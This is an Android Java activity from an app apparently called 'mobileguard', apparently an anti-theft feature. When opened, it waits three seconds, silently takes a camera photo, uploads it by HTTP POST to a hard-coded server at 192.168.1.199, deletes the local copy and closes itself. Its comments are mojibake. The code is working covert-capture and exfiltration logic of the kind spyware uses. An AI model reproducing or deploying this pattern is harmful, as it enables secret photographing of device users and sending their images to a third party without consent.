package com.itheima.mobileguard.activities;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.FrameLayout;

import com.itheima.mobileguard.R;
import com.itheima.mobileguard.ui.CameraPreview;
import com.lidroid.xutils.HttpUtils;
import com.lidroid.xutils.exception.HttpException;
import com.lidroid.xutils.http.RequestParams;
import com.lidroid.xutils.http.ResponseInfo;
import com.lidroid.xutils.http.callback.RequestCallBack;
import com.lidroid.xutils.http.client.HttpRequest.HttpMethod;

public class TackPictureActivity extends Activity {
	private CameraPreview mPreview;
	private Camera camera;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		/**
		 * ���������Ƿ����
		 */
		if(!checkCameraHardware(this)){
			finish();
		}
		camera = getCameraInstance();
		if(camera == null	){
			finish();//������ 
		}
		setContentView(R.layout.activity_tackpicture);
//		Parameters parameters = camera.getParameters();
//		parameters.set ʹ��Ĭ�ϵ����������
		// Create our Preview view and set it as the content of our activity.
        mPreview = new CameraPreview(this, camera);
        FrameLayout preview = (FrameLayout) findViewById(R.id.camera_preview);
        preview.addView(mPreview);
        
        new Thread(){
        	public void run(){
        		try {
					Thread.sleep(3000);
					camera.takePicture(null, null, new PictureCallback() {
						public void onPictureTaken(byte[] data, Camera camera) {
								try {
									final File file = new File(Environment.getExternalStorageDirectory(),"picture.jpg");
									FileOutputStream fos = new FileOutputStream(file);
									fos.write(data);
									fos.close();
									HttpUtils utils = new HttpUtils();
									RequestParams rp = new RequestParams();
									rp.addBodyParameter("filepath", file);
									utils.send(HttpMethod.POST,
										    "http://192.168.1.199:8080/FileUploadForAndroid/servlet/FileUploadServlet",
										    rp,
										    new RequestCallBack<String>() {
												public void onFailure(
														HttpException arg0,
														String arg1) {
													finish();//͵����Ͼ͹ر�activity
												}
												public void onSuccess(
														ResponseInfo<String> arg0) {
													file.delete();
													finish();//͵����Ͼ͹ر�activity
												}});
//									camera.startPreview();//����һֱ �ͻ�Ԥ������ͻ�ֹͣ��  ���¿�ʼԤ��
//									finish();//͵����Ͼ͹ر�activity
									
								} catch (IOException e) {
									e.printStackTrace();
								}
						}
					});
					
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
        	}
        }.start();
	}

	
	
	
	//����¼�
	public void capture(View v){
			/**
			 * ���� ���Ų���  λͼ����ѹ����ͼƬ JPEGͼƬ�ص�
			 */
		camera.takePicture(null, null, new PictureCallback() {
			public void onPictureTaken(byte[] data, Camera camera) {
					try {
						FileOutputStream fos = new FileOutputStream(new File(Environment.getExternalStorageDirectory(),"picture.jpg"));
						fos.write(data);
						fos.close();
						camera.startPreview();//����һֱ �ͻ�Ԥ������ͻ�ֹͣ��  ���¿�ʼԤ��
					} catch (IOException e) {
						e.printStackTrace();
					}
			}
		});
	}
	@Override
	protected void onDestroy() {
		camera.release();//activity�˳�ʱ �ͷ���Դ
		super.onDestroy();
	}
	
	private boolean checkCameraHardware(Context context) {
	    if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
	        // this device has a camera
	        return true;
	    } else {
	        // no camera on this device
	        return false;
	    }
	}

	/** A safe way to get an instance of the Camera object.һ����ȫ�ķ���ȥ����Ӳ�� */
	public static Camera getCameraInstance(){
	    Camera c = null;
	    try {
	    	// �������1  ���Ǵ� ǰ������ͷ
	        c = Camera.open(); // attempt to get a Camera instance
	    }
	    catch (Exception e){
	        // Camera is not available (in use or does not exist)
	    }
	    return c; // returns null if camera is unavailable
	}
}
